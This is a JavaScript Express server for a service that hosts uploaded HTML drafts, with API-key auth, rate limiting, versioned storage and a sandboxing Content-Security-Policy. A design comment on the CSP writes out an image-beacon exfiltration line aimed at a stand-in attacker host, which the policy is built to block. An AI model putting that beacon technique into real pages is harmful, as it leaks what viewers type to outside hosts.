import express from "express";
import { contentHash, randomToken, sha256 } from "./crypto.js";
import { config } from "./config.js";
import { findApiKeyByToken, newEventId, pool, publicUploadAuth, withTransaction } from "./db.js";
import { newDraftId, newInternalId } from "./ids.js";
import { renderHome, renderNotFound } from "./render.js";
import { createRateLimiter } from "./rate-limit.js";
import { getHtmlObject, putHtmlObject } from "./storage.js";
import { validateHtml } from "./html-policy.js";
import { clientIp } from "./client-ip.js";
import { listAccountDrafts } from "./drafts.js";
import { registerWebRoutes } from "./web.js";
import {
  getDraftIdFromHost,
  getDraftPublicUrl,
  getDraftRawUrl,
  getHomeUrl,
  getRequestBaseUrl
} from "./public-url.js";

export function createApp() {
  const app = express();
  app.set("trust proxy", true);
  const uploadIpRateLimit = createRateLimiter({
    windowMs: Number(process.env.UPLOAD_IP_RATE_LIMIT_WINDOW_MS || 60_000),
    max: Number(process.env.UPLOAD_IP_RATE_LIMIT_MAX || 60),
    keyPrefix: "upload-ip",
    key: (req) => clientIp(req) || "anonymous"
  });
  const uploadKeyRateLimit = createRateLimiter({
    windowMs: Number(process.env.UPLOAD_RATE_LIMIT_WINDOW_MS || 60_000),
    max: Number(process.env.UPLOAD_RATE_LIMIT_MAX || 30),
    keyPrefix: "upload-key",
    key: (req) => req.auth?.id || clientIp(req) || "anonymous"
  });

  // Scoped to /api so that draft GETs carrying a stray JSON body (some HTTP
  // clients always send Content-Type: application/json) can never fail with a
  // body-parser error instead of the draft HTML.
  app.use("/api", express.json({ limit: process.env.UPLOAD_BODY_LIMIT || "2mb" }));
  app.use(noStoreHeaders);

  app.get("/", async (req, res, next) => {
    try {
      const draftId = getDraftIdFromRequest(req);
      if (draftId) {
        await renderDraft(req, res, { draftId });
        return;
      }

      res.type("html").send(renderHome({ publicBaseUrl: getHomeUrlForRequest(req) }));
    } catch (error) {
      next(error);
    }
  });

  app.get("/healthz", async (req, res) => {
    try {
      await pool.query("SELECT 1");
      res.json({ ok: true });
    } catch (error) {
      res.status(503).json({ ok: false, error: error.message });
    }
  });

  app.get("/api/me", requireAuth, (req, res) => {
    res.json({
      accountId: req.auth.account_id,
      accountName: req.auth.account_name,
      apiKeyId: req.auth.id,
      apiKeyName: req.auth.name
    });
  });

  // The "my docs" feed — shared with the dashboard (src/drafts.js).
  app.get("/api/drafts", requireAuth, async (req, res, next) => {
    try {
      const drafts = await listAccountDrafts(req.auth.account_id, {
        requestBaseUrl: getRequestBaseUrl(req)
      });
      res.json({ ok: true, drafts });
    } catch (error) {
      next(error);
    }
  });

  app.post("/api/api-keys", requireAuth, async (req, res, next) => {
    try {
      const token = `pp_${randomToken(32)}`;
      const apiKeyId = newInternalId();
      const name = cleanText(req.body?.name) || "CLI API Key";

      await pool.query(
        `
          INSERT INTO api_keys (id, account_id, name, key_hash)
          VALUES ($1, $2, $3, $4)
        `,
        [apiKeyId, req.auth.account_id, name, sha256(token)]
      );

      res.status(201).json({
        ok: true,
        apiKey: {
          id: apiKeyId,
          name
        },
        token
      });
    } catch (error) {
      next(error);
    }
  });

  app.post("/api/api-keys/:apiKeyId/revoke", requireAuth, async (req, res, next) => {
    try {
      const result = await pool.query(
        `
          UPDATE api_keys
          SET revoked_at = now()
          WHERE id = $1
            AND account_id = $2
            AND revoked_at IS NULL
          RETURNING id
        `,
        [req.params.apiKeyId, req.auth.account_id]
      );

      if (!result.rowCount) {
        return res.status(404).json({ ok: false, error: "API key not found." });
      }

      res.json({ ok: true });
    } catch (error) {
      next(error);
    }
  });

  app.post("/api/uploads", uploadIpRateLimit, optionalUploadAuth, uploadKeyRateLimit, async (req, res, next) => {
    try {
      const { html, filename, metadata = {}, draftId, description } = req.body || {};
      const validation = validateHtml(html, { maxBytes: config.maxHtmlBytes });

      if (!validation.ok) {
        return res.status(422).json({
          ok: false,
          errors: validation.errors,
          warnings: validation.warnings
        });
      }

      const byteLength = Buffer.byteLength(html, "utf8");
      const nowHash = contentHash(html);
      const sourceIp = clientIp(req);
      // Vercel's edge sets x-vercel-id and documents it for correlating
      // against request logs, so we store it verbatim rather than minting our own.
      const requestId = cleanText(req.get("x-vercel-id"));
      const stats = validation.stats || { hasInlineScript: false, externalImageHosts: [] };

      const result = await withTransaction(async (client) => {
        const existingDraft = draftId
          ? await findOwnedDraft(client, draftId, req.auth.account_id)
          : null;

        if (draftId && !existingDraft) {
          const error = new Error("Draft not found.");
          error.statusCode = 404;
          throw error;
        }

        const draft = existingDraft || {
          id: newDraftId(),
          account_id: req.auth.account_id
        };

        const versionNumber = existingDraft
          ? Number(
              (
                await client.query(
                  "SELECT COALESCE(MAX(version_number), 0) + 1 AS next_version FROM draft_versions WHERE draft_id = $1",
                  [draft.id]
                )
              ).rows[0].next_version
            )
          : 1;

        const versionId = newInternalId();
        const objectKey = `drafts/${draft.id}/versions/${versionId}.html`;
        const title = validation.title || existingDraft?.title || filename || "Untitled Draft";

        // putHtmlObject returns the blob URL; that URL is what gets persisted
        // as object_key, so reads are a single fetch with no listing round trip.
        const objectUrl = await putHtmlObject(objectKey, html);

        if (!existingDraft) {
          await client.query(
            `
              INSERT INTO drafts (id, account_id, title, description, repo_org, repo_name, repo_host)
              VALUES ($1, $2, $3, $4, $5, $6, $7)
            `,
            [
              draft.id,
              req.auth.account_id,
              title,
              cleanText(description, 1000),
              cleanText(metadata.repoOrg),
              cleanText(metadata.repoName),
              cleanText(metadata.repoHost)
            ]
          );
        }

        await client.query(
          `
            INSERT INTO draft_versions (
              id, draft_id, version_number, object_key, content_hash, file_size,
              created_by_api_key_id, source_ip, user_agent, cli_version,
              git_branch, git_commit_sha, original_filename,
              git_commit_subject, git_dirty, request_id, has_inline_script,
              external_image_hosts, ci_run_url, ci_actor
            )
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13,
                    $14, $15, $16, $17, $18, $19, $20)
          `,
          [
            versionId,
            draft.id,
            versionNumber,
            objectUrl,
            nowHash,
            byteLength,
            req.auth.id,
            sourceIp,
            req.get("user-agent") || null,
            cleanText(metadata.cliVersion),
            cleanText(metadata.gitBranch),
            cleanText(metadata.gitCommitSha),
            cleanText(filename),
            cleanText(metadata.gitCommitSubject),
            typeof metadata.gitDirty === "boolean" ? metadata.gitDirty : null,
            requestId,
            stats.hasInlineScript,
            JSON.stringify(stats.externalImageHosts || []),
            cleanText(metadata.ciRunUrl),
            cleanText(metadata.ciActor)
          ]
        );

        await client.query(
          `
            UPDATE drafts
            SET current_version_id = $1,
                title = $2,
                description = COALESCE($3, description),
                repo_org = COALESCE($4, repo_org),
                repo_name = COALESCE($5, repo_name),
                repo_host = COALESCE($6, repo_host),
                updated_at = now()
            WHERE id = $7
          `,
          [
            versionId,
            title,
            cleanText(description, 1000),
            cleanText(metadata.repoOrg),
            cleanText(metadata.repoName),
            cleanText(metadata.repoHost),
            draft.id
          ]
        );

        await client.query(
          `
            INSERT INTO upload_events (
              id, draft_id, draft_version_id, api_key_id, event_type,
              source_ip, user_agent, metadata_json
            )
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
          `,
          [
            newEventId(),
            draft.id,
            versionId,
            req.auth.id,
            existingDraft ? "draft.updated" : "draft.created",
            sourceIp,
            req.get("user-agent") || null,
            metadata
          ]
        );

        return {
          draftId: draft.id,
          versionId,
          versionNumber,
          title,
          requestId,
          publicUrl: getDraftPublicUrl({
            draftId: draft.id,
            publicBaseUrl: config.publicBaseUrl,
            requestBaseUrl: getRequestBaseUrl(req)
          }),
          rawUrl: getDraftRawUrl({
            draftId: draft.id,
            publicBaseUrl: config.publicBaseUrl,
            requestBaseUrl: getRequestBaseUrl(req)
          }),
          warnings: validation.warnings
        };
      });

      res.status(draftId ? 200 : 201).json({ ok: true, ...result });
    } catch (error) {
      next(error);
    }
  });

  app.delete("/api/drafts/:draftId", requireAuth, async (req, res, next) => {
    try {
      const result = await pool.query(
        `
          UPDATE drafts
          SET deleted_at = now(), updated_at = now()
          WHERE id = $1
            AND account_id = $2
            AND deleted_at IS NULL
          RETURNING id
        `,
        [req.params.draftId, req.auth.account_id]
      );

      if (!result.rowCount) {
        return res.status(404).json({ ok: false, error: "Draft not found." });
      }

      res.json({ ok: true });
    } catch (error) {
      next(error);
    }
  });

  app.post("/api/drafts/:draftId/disable", requireAuth, async (req, res, next) => {
    try {
      const reason = cleanText(req.body?.reason) || "Disabled by owner.";
      const result = await pool.query(
        `
          UPDATE drafts
          SET disabled_at = now(), disabled_reason = $3, updated_at = now()
          WHERE id = $1
            AND account_id = $2
            AND deleted_at IS NULL
          RETURNING id
        `,
        [req.params.draftId, req.auth.account_id, reason]
      );

      if (!result.rowCount) {
        return res.status(404).json({ ok: false, error: "Draft not found." });
      }

      res.json({ ok: true });
    } catch (error) {
      next(error);
    }
  });

  registerWebRoutes(app);

  // Every draft URL serves the raw uploaded HTML. The `/raw` aliases are kept
  // because the upload API and CLI hand them out as the canonical agent URL.
  const serveCurrent = async (req, res, next) => {
    try {
      const draftId = getDraftIdFromRequest(req);
      if (!draftId) {
        next();
        return;
      }
      await renderDraft(req, res, { draftId });
    } catch (error) {
      next(error);
    }
  };

  const serveVersion = async (req, res, next) => {
    try {
      const draftId = getDraftIdFromRequest(req);
      if (!draftId) {
        next();
        return;
      }
      await renderDraft(req, res, {
        draftId,
        versionNumber: Number(req.params.versionNumber)
      });
    } catch (error) {
      next(error);
    }
  };

  app.get("/raw", serveCurrent);
  app.get("/v/:versionNumber", serveVersion);
  app.get("/v/:versionNumber/raw", serveVersion);

  app.get(["/d/:draftId", "/d/:draftId/raw"], async (req, res, next) => {
    try {
      await renderDraft(req, res, { draftId: req.params.draftId });
    } catch (error) {
      next(error);
    }
  });

  app.get(
    ["/d/:draftId/v/:versionNumber", "/d/:draftId/v/:versionNumber/raw"],
    async (req, res, next) => {
      try {
        await renderDraft(req, res, {
          draftId: req.params.draftId,
          versionNumber: Number(req.params.versionNumber)
        });
      } catch (error) {
        next(error);
      }
    }
  );

  app.use((req, res) => {
    res.status(404).type("html").send(renderNotFound());
  });

  app.use((error, req, res, _next) => {
    const status = error.statusCode || 500;
    const message = status >= 500 ? "Internal server error." : error.message;
    if (status >= 500) {
      console.error(error);
    }
    res.status(status).json({ ok: false, error: message });
  });

  return app;
}

// Serve the exact uploaded HTML, byte for byte, to EVERY client — browsers,
// curl, and agent fetchers alike. There is deliberately no browser detection,
// iframe wrapper, or consent interstitial: any heuristic that tried to tell an
// agent from a browser inevitably misclassified some agent fetcher and hid the
// draft content the service exists to share. A draft URL is now just its HTML.
async function renderDraft(req, res, { draftId, versionNumber }) {
  if (
    versionNumber !== undefined &&
    (!Number.isInteger(versionNumber) || versionNumber < 1)
  ) {
    return res.status(404).type("html").send(renderNotFound());
  }

  const { draft, version } = await findPublicDraftVersion(draftId, versionNumber);
  if (!draft || !version) {
    return res.status(404).type("html").send(renderNotFound());
  }

  const html = await getHtmlObject(version.object_key);
  // Rows from before content signals existed have has_inline_script = null;
  // treat unknown as scripted so they get the stricter policy.
  res.setHeader(
    "Content-Security-Policy",
    draftContentSecurityPolicy({ scripted: version.has_inline_script !== false })
  );
  // Drafts are reachable only by unguessable ID; keep crawlers from turning a
  // shared link into a search result.
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  res.setHeader("X-Myhtmls-Draft-Id", draft.id);
  res.setHeader("X-Myhtmls-Draft-Version", String(Number(version.version_number)));
  res.type("html").send(html);
}

// A CSP is the only thing kept from the old serving path. It never alters the
// bytes a curl/agent client reads, so it does not gate content in any way; it
// only constrains what the page may do if a human opens it in a browser —
// blocking script execution, cross-origin network requests, and form posts.
// Uploaded drafts are already external-script/-form/-iframe free (see
// validateHtml) and live on isolated per-draft origins.
// Deviation from upstream postplan (script-src 'none'): inline classic
// scripts are allowed to RUN, but inside a CSP sandbox with no
// allow-same-origin — the document gets an opaque origin, so storage throws,
// fetch/XHR are dead, and it cannot touch cookies or any myhtmls origin.
// Everything else the upload policy already strips (external scripts, forms,
// frames, handlers) stays blocked here as defense in depth.
//
// The policy is per-version: a draft whose stored version contains inline
// script loses network images and fonts (data: only) and silent popups.
// Otherwise a script could bypass connect-src 'none' with an image beacon —
// new Image().src = "https://attacker/?d=..." — and exfiltrate whatever a
// viewer typed into the page. Script-free drafts keep https images; scripts
// and arbitrary-host images are never available together. The remaining
// escape for scripted drafts is a full-page navigation on user click, which
// is visible to the viewer rather than silent.
function draftContentSecurityPolicy({ scripted }) {
  const sandbox = scripted
    ? "sandbox allow-scripts allow-top-navigation-by-user-activation"
    : "sandbox allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation";
  return [
    sandbox,
    "default-src 'none'",
    "script-src 'unsafe-inline'",
    "style-src 'unsafe-inline'",
    scripted ? "img-src data:" : "img-src https: data:",
    scripted ? "font-src data:" : "font-src https: data:",
    "connect-src 'none'",
    "frame-src 'none'",
    "worker-src 'none'",
    "base-uri 'none'",
    "form-action 'none'",
    "frame-ancestors 'none'"
  ].join("; ");
}

async function findPublicDraftVersion(draftId, versionNumber) {
  const draftResult = await pool.query(
    `
      SELECT *
      FROM drafts
      WHERE id = $1
        AND deleted_at IS NULL
        AND disabled_at IS NULL
      LIMIT 1
    `,
    [draftId]
  );

  const draft = draftResult.rows[0] || null;
  if (!draft) return { draft: null, version: null };

  const versionResult = versionNumber
    ? await pool.query(
        `
          SELECT *
          FROM draft_versions
          WHERE draft_id = $1 AND version_number = $2
          LIMIT 1
        `,
        [draft.id, versionNumber]
      )
    : await pool.query("SELECT * FROM draft_versions WHERE id = $1 LIMIT 1", [
        draft.current_version_id
      ]);

  return { draft, version: versionResult.rows[0] || null };
}

async function findOwnedDraft(client, draftId, accountId) {
  const result = await client.query(
    `
      SELECT *
      FROM drafts
      WHERE id = $1
        AND account_id = $2
        AND deleted_at IS NULL
      LIMIT 1
    `,
    [draftId, accountId]
  );
  return result.rows[0] || null;
}

async function requireAuth(req, res, next) {
  const auth = await optionalAuth(req);
  if (!auth) {
    return res.status(401).json({ ok: false, error: "Missing or invalid API key." });
  }
  req.auth = auth;
  next();
}

async function optionalUploadAuth(req, res, next) {
  const auth = await optionalAuth(req);
  if (auth) {
    req.auth = auth;
    return next();
  }
  // Upstream postplan defaults to anonymous public uploads; myhtmls requires
  // a key unless MYHTMLS_ALLOW_ANONYMOUS_UPLOADS=1 restores that behavior.
  if (!config.allowAnonymousUploads) {
    return res.status(401).json({ ok: false, error: "Missing or invalid API key." });
  }
  req.auth = publicUploadAuth;
  next();
}

async function optionalAuth(req) {
  const header = req.get("authorization") || "";
  const match = header.match(/^Bearer\s+(.+)$/i);
  if (!match) return null;
  return findApiKeyByToken(match[1].trim());
}

function noStoreHeaders(req, res, next) {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Cache-Control", "no-store");
  next();
}

function getHomeUrlForRequest(req) {
  return getHomeUrl({
    publicBaseUrl: config.publicBaseUrl,
    requestBaseUrl: getRequestBaseUrl(req)
  });
}

function getDraftIdFromRequest(req) {
  return getDraftIdFromHost({
    publicBaseUrl: config.publicBaseUrl,
    host: req.hostname || req.get("host")
  });
}

function cleanText(value, maxLength = 255) {
  if (typeof value !== "string") return null;
  const trimmed = value.trim();
  return trimmed ? trimmed.slice(0, maxLength) : null;
}
